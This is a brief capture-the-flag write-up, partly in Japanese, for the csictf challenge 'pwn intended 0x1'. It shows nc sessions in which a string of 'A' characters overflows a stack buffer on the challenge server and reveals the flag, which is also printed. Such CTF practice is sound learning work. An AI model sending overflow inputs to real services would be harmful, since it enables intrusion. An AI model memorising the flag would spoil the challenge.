# pwn intended 0x1:Pwn:100pts
I really want to have some coffee!  
nc chall.csivit.com 30001  
[pwn-intended-0x1](pwn-intended-0x1)  

# Solution
BOF問だと思ったのではじめにncして適当にAを50ほど入力した。  
```bash
$ nc chall.csivit.com 30001
Please pour me some coffee:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Thanks!

Oh no, you spilled some coffee on the floor! Use the flag to clean it.
csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}
```
flagがでた。  
おそらくスタックの変数を壊す問題だったようだ。  
以下が想定解。  
```bash
$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | nc chall.csivit.com 30001
Please pour me some coffee:

Thanks!

Oh no, you spilled some coffee on the floor! Use the flag to clean it.
csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}
```

## csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}